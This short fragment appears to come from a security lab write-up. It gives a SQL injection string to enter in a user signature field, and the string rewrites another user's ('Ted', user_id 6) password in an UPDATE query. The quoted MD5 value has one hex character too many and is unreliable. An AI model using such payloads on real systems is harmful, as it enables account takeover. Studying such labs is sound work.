...
Put the following into the user signature:
...
Without knowing current user's password; md5 of "pass"\\
For Ted's password: \texttt{', user_password = "1a1dc91c907325c69271ddf0c944bc72a" WHERE user_id = 6 # '}
